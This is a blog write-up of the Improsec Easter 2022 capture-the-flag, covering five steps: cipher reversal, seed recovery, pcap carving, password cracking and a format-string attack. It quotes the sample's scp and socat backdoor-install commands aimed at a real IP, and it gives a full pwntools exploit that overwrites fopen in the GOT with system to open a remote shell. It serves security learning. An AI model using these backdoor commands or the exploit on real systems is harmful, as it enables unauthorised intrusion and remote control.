---
layout: post
title:  "Improsec Easter Egg CTF 2022 - Writeup"
date:   2022-04-23 19:59:44 +0100
categories: ctf hacking
---
# Write up of Easter Egg from Improsec

Improsec has created a nice CTF in the Easter 2022. See https://github.com/improsec/easter-ctf-2022

The CTF has five flags. You have to find one flag to get the step for the next flag.

## Step 1 - Initial step
At first we got a python script and a message that has been encoded using the python script.

The pythons script have this code:

{% highlight python %}
        a = PRNG()
        b = bytes([x ^ a.next() for x in data])

        for x, y in [((z & 0xf), ((z >> 4) & 0xf)) for z in b]:
            print(x, y, end=' ')
{% endhighlight %}

This algorithm can be reversed to the following:

{% highlight python %}
        a = PRNG()
        r = []
        for i in range(0,len(data),2):
            x,y = map(int,data[i:i+2])
            z = x+(y<<4)
            r.append(z^a.next())
        with open('output.bin','wb') as fout:
            fout.write(bytes(r))
{% endhighlight %}

This give the flag: improsegg{big_bad_xorosaurus_rex!!} and the next step

## Step 2 - AES Encrypted data
The next step contains an AES encrypted blob. However there is a small error generating the key.

The encrypting script uses the following to generate the key and IV:

{% highlight python %}
        random.seed(int(datetime.now().strftime('%H%M%S')))
        key = randbytes(0x10).replace(b'\x00', b'\xff')
        iv = randbytes(0x10).replace(b'\x00', b'\xff')
{% endhighlight %}

This might seem like the key can be hard to find. We get the IV and since the seed is on the form HHMMSS where HH 00<=23 and MM and SS is 00<=59 can it very fast be found that the time 19:43:55 will generate the save IV and therefore the same key used for encryption. Changing the code to the following will decrypt the file and write it to disk:

{% highlight python %}
        random.seed(194355)
        key = randbytes(0x10).replace(b'\x00', b'\xff')
        iv = randbytes(0x10).replace(b'\x00', b'\xff')
        output_data = decrypt(key,iv,data)
        with open('output.zip','wb') as fout:
            fout.write(output_data)
{% endhighlight %}

This will give a zip file which contains a pcap and a flag.

The flag: improsegg{seeds_and_vegetation_yo!}

## Step 3 - Network analysis
The next step is a pcap file. Using wireshark can it be seen that the pcap only contains ICMP and DNS packets.

The DNS packets contains the password for the data in the ICMP packets.

The ICMP packets contains a zipfile, where the payload bytes of the ICMP packets is in the following form:

First four bytes is an int in little endian of the index in the file where the next 8 bytes must be placed.

Using this knowledge could the following python script be made:

{% highlight python %}
from scapy.all import *
import sys

FILE = sys.argv[1]

packets = rdpcap(FILE)
data = []
complete_passwd = ''
for packet in packets:
    if ICMP in packet and packet[ICMP].type == 0x08:
        p = bytes(packet[ICMP].payload)
        index = p[0:4]
        index = int.from_bytes(index,byteorder='little')
        data.append((index,p[4:]))
    if DNS in packet:
        if packet[DNS].qr == 0:
            r = packet[DNS].qd.qname.decode().split('.')[0]
            complete_passwd += r
            print(r,end='')
print()
#Since we know that the password is in lowercase:
print(complete_passwd.split('___')[1].lower())

with open('extracted.zip','wb') as fout:
    for i,x in sorted(data,key=lambda x:x[0]):
        fout.write(x)
{% endhighlight %}

This gives and encrypted zip file, but we have the zip password from the DNS packets so it is a breeze to extract.

That gives us an exe file and the flag: improsegg{exfiltrating_like_a_baws}

## Step 4 - Find secrets in the exe
The exe files contains the following strings:

wb
backdoor.zip
scp backdoor.zip root@164.92.150.74:/tmp/backdoor.zip
ssh root@164.92.150.74 'unzip -d /tmp/ /tmp/backdoor.zip'
ssh root@164.92.150.74 'socat TCP-LISTEN:1337,reuseaddr,fork EXEC:/tmp/backdoor'

This could point the direction of somekind of data being written to a zip file, then uploaded to a server for lastly being run.

The data in the exe is encrypted. The encryption was identified to be of the SALSA20 family.

The program ask for a user and a password. If the password is not correct will the zip file not be written and the program will exit.

In the code is it found that the correct key must be:

96 db cc cf 42 45 ee 91 6f 5e 2d 39 87 cc 26 35 31 3d 87 16 05 e1 08 05 27 4b 84 5c 3e cd 87 22

However this is not something that be input'ed directly because of some manipulation of the input.

The input is always converted to a fixed length, so that points in direction of a hash function. After googling constant is the hash function found to be sha256.

However, before the password entered by the user is hashed is it manipulated.

The following python script reverse the algorithm and search for a password from rockyou or another file with passwords.

{% highlight python %}
def bit_not(n, numbits=8):
    return (1 << numbits) - 1 - n

def enc(pw):
    pw = list(pw)
    for x in range(len(pw)):
        pw[x] = pw[x] + 1
        pw[x] = bit_not((pw[(x+1) % len(pw)] ^ pw[x]) + 100) & 0xff
    return bytes(pw)


with open(sys.argv[1], "rb") as f:
    for line in f:
        line = line.strip()
        pw = enc(line)
        hsh = hashlib.sha256(pw).hexdigest()
        if hsh == "96dbcccf4245ee916f5e2d3987cc2635313d871605e10805274b845c3ecd8722":
            print(line)
{% endhighlight %}

The password is found to be nathanxyz123

This gives a zip file with a new binary and the flag: improsegg{debugging_like_cha_cha!!}

### Notes:

The zip file is deleted, however if you create a file called scp.bat in the same directory as backdoor_installer.exe with the following content: `pause` can you get the program to wait while you copy the backdoor.zip file.

## Step 5 - Take over the C2 server
In the last step must you take over the C2 server.

The password that is used when connecting can be seen as a md5 hash in the binary.

After using crackstation.net (or your favorite md5 cracking tool) is the login password found to be shopgirl711 (MD5 Hash: 159b3b263de3f0019cc7358f71eeb7c3)

This will give you access to a menu where you can run a few commands. Including maps.

In the code is a line where it prints what ever you want to run. This can be used to do a format string attack.

It can be seen that the maps command is executed using a value in the `maps_file` variable. The goal is to overwrite this variable.

First step is to find the maps_file offset. Using gdb can the following be seen:

{% highlight %}
gef➤  p &maps_file
$1 = (<data variable, no debug info> *) 0x5555555580c0 <maps_file>
{% endhighlight %}

This gives is an offset of maps_file to be at base of backdoor+0x40c0

To overwrite maps_file with '/bin/sh' and changing the call to fopen to system can we get a shell.

The offset of fopen, which are to overwritten is found to be at (using the got command from gef)
[0x555555558038] fopen@GLIBC_2.2.5  →  0x555555555086

This gives an offset from base to be at: base+0x4038

The systemcall address that we want to write to the fopen position is found in the libc. The offset is found using the following command:

{% highlight %}
gef➤  p &system
$2 = (int (*)(const char *)) 0x7ffff7b462c0 <__libc_system>
{% endhighlight %}

This gives and offset from the libc base to be at: +0x522c0

Using the pwntools from python can the flag be found:

{% highlight python %}
from pwn import *

# context.binary = ELF("./backdoor")

host = '164.92.150.74'
port = 1337

def exec_fmt(payload):
    r = remote(host,port)
    r.sendlineafter(b"Enter username: ", b"improsec")
    r.sendlineafter(b"Enter password: ", b"shopgirl711")
    r.sendlineafter(b"Enter command: ", payload)
    r.recvuntil(b"Trying to execute command: ")
    res = r.recvline()
    print(res)
    return res

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

r = remote(host,port)

r.sendlineafter(b"Enter username: ", b"improsec")
r.sendlineafter(b"Enter password: ", b"shopgirl711")

r.sendlineafter(b"Enter command: ", b"maps")
r.recvline()
map_oversigt = r.recvline()
base = int(map_oversigt.split(b"-")[0],16)
libc_base = 0
for i in range(100):
    line = r.recvline()
    if b'libc' in line:
        libc_base = int(line.split(b"-")[0],16)
        log.info(f"{line}")
        break

maps = base+0x40c0
fopen = base+0x4038
system = libc_base+0x522c0
writes = {maps: u64(b"/bin/sh\x00"), fopen: system}
payload = fmtstr_payload(offset, writes)
r.sendlineafter(b"Enter command: ", payload)
r.sendlineafter(b"Enter command: ", b'maps')
r.interactive()
{% endhighlight %}

This will give you a shell where you can do a `cat flag.txt` and get the final flag: improsegg{backdooring_a_backdoor!?}

# Conclusion

Thanks to Improsec to make a nice Easter Egg CTF which a lot of great learning points.

Thanks to everyone which exchanged views and pointers.